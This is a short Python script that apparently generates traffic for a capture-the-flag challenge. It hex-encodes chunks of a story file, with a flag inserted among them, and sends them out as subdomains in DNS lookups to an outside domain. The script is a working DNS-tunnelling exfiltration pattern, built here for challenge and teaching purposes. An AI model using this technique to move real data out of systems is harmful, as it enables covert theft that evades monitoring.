import sys
import yaml
import socket
from time import sleep
from pathlib import Path
from random import randint
from binascii import hexlify

TLD = "gamna.cher.is"
CHUNK_SIZE = 31
HERE = Path(__file__).parent
FLAG = yaml.safe_load(open(HERE / "meta.yml"))["flags"]

with open(sys.argv[1], "r") as f:
    story = f.read()

chunks = [story[i:i+CHUNK_SIZE] for i in range(0, len(story), CHUNK_SIZE)]
chunks.insert(randint(int(len(chunks) * 0.4), int(len(chunks) * 0.7)), FLAG)

for i in range(5):
    print(5 - i)
    sleep(1)

for chunk in chunks:
    encoded = hexlify(chunk.encode()).decode()
    socket.gethostbyname(f"{encoded}.{TLD}")

